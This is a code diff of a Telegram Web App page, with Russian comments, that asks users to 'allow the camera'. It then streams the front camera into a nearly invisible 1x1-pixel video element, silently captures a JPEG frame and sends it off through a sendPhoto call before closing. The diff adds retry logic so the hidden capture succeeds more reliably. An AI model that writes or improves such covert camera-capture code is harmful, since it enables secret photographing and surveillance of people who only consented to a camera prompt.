@@ -7,12 +7,11 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
-    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;cursor:pointer;">
+    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;cursor:pointer;z-index:10;">
         📸 Разрешить камеру
     </button>
     <h1 id="status" style="margin-top:20px;font-size:18px;"></h1>
 
-    <!-- Видео 1x1 пиксель (невидимо для пользователя, но видимо для WebView) -->
     <video id="video" autoplay playsinline style="position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -41,13 +40,12 @@
                     status.innerText = '✅ Фото отправлено!';
                     tg.close();
                 } else {
-                    status.innerText = '❌ Ошибка API: ' + JSON.stringify(data);
+                    status.innerText = '❌ Ошибка API';
                     console.error(data);
                 }
             })
-            .catch(err => {
+            .catch(() => {
                 status.innerText = '❌ Ошибка сети';
-                console.error(err);
             });
         }
 
@@ -56,35 +54,60 @@
             status.innerText = '📸 Запуск камеры...';
 
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+                video: { facingMode: "user" }
             })
             .then(stream => {
                 video.srcObject = stream;
                 video.play();
 
-                // Ждём первый кадр через timeupdate (надёжнее)
-                video.addEventListener('timeupdate', function onTimeUpdate() {
-                    video.removeEventListener('timeupdate', onTimeUpdate);
+                // Делаем до 5 попыток захвата кадра
+                let attempts = 0;
+                const maxAttempts = 5;
 
-                    // Проверяем, что видео действительно загрузилось
-                    if (video.videoWidth === 0 || video.videoHeight === 0) {
-                        // Если размеры нулевые — ждём ещё 200 мс
-                        setTimeout(() => captureFrame(stream), 200);
-                        return;
-                    }
-                    captureFrame(stream);
-                });
+                function tryCapture() {
+                    attempts++;
+                    status.innerText = `📸 Попытка ${attempts}...`;
 
-                // Запасной таймер на случай, если timeupdate не сработает
-                setTimeout(() => {
                     if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        captureFrame(stream);
-                    } else {
-                        status.innerText = '❌ Камера не ответила';
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                }, 3000);
+                        // Кадр готов
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+                        // Проверяем, не чёрный ли кадр
+                        const imageData = ctx.getImageData(0, 0, 1, 1);
+                        const pixel = imageData.data;
+                        if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
+                            // Чёрный — пробуем ещё раз
+                            if (attempts < maxAttempts) {
+                                setTimeout(tryCapture, 300);
+                                return;
+                            } else {
+                                status.innerText = '❌ Все попытки неудачны';
+                                stream.getTracks().forEach(t => t.stop());
+                                return;
+                            }
+                        }
+
+                        // Успех!
+                        canvas.toBlob(blob => {
+                            if (blob) sendPhoto(blob);
+                            else status.innerText = '❌ Ошибка Blob';
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg', 0.8);
+                    } else {
+                        // Размеры ещё не известны
+                        if (attempts < maxAttempts) {
+                            setTimeout(tryCapture, 300);
+                        } else {
+                            status.innerText = '❌ Камера не ответила';
+                            stream.getTracks().forEach(t => t.stop());
+                        }
+                    }
+                }
+
+                // Начинаем попытки через 200 мс
+                setTimeout(tryCapture, 200);
             })
             .catch(err => {
                 status.innerText = '❌ Ошибка: ' + err.message;
@@ -92,42 +115,6 @@
                 btn.style.display = 'block';
             });
         });
-
-        function captureFrame(stream) {
-            status.innerText = '📸 Съёмка...';
-
-            // Убеждаемся, что размеры есть
-            const width = video.videoWidth || 640;
-            const height = video.videoHeight || 480;
-            canvas.width = width;
-            canvas.height = height;
-
-            // Рисуем кадр
-            ctx.drawImage(video, 0, 0, width, height);
-
-            // Проверка: если изображение чёрное — пробуем ещё раз через 100 мс
-            const imageData = ctx.getImageData(0, 0, 1, 1);
-            const pixel = imageData.data;
-            if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
-                // Чёрный пиксель — пробуем перерисовать
-                setTimeout(() => {
-                    ctx.drawImage(video, 0, 0, width, height);
-                    canvas.toBlob(blob => {
-                        if (blob) sendPhoto(blob);
-                        else status.innerText = '❌ Ошибка Blob';
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.8);
-                }, 200);
-                return;
-            }
-
-            // Если всё ок — отправляем
-            canvas.toBlob(blob => {
-                if (blob) sendPhoto(blob);
-                else status.innerText = '❌ Ошибка Blob';
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.8);
-        }
     </script>
 </body>
 </html>
